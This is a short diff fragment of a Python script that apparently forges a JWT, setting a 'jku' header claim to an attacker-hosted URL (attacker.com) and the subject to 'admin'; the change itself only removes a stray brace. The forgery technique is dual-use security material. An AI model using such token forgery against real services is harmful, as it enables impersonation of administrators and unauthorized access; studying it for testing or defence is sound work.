@@ -87,7 +87,6 @@ header = {"kid": "HS256","alg": "HS256"}
 claims = {"jku": "http://attacker.com/secret",
           "exp": 1617459556,"jti": "hQT90SFLRlhi_xSJlB2KWg",
           "iat": 1616854756,"nbf": 1616854636,"sub": "admin"}
-}
           
 # create token
 token = jwt.JWT(header=header,claims=claims)
